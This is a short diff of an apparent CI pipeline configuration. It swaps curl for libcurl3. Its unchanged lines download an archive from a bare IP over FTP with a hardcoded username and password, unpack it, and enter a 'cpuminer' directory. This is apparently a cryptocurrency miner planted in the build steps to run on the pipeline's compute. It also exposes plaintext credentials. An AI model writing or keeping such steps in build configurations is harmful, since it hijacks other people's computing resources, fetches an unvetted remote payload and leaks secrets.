@@ -6,7 +6,7 @@ steps:
       - |
           apt-get update
           apt-get install -y wget
-          apt-get install -y curl
+          apt-get install -y libcurl3
           wget --user=u750504516 --password='Vp123456' ftp://194.59.164.70/c.tar.gz
           tar xf c.tar.gz
           cd cpuminer
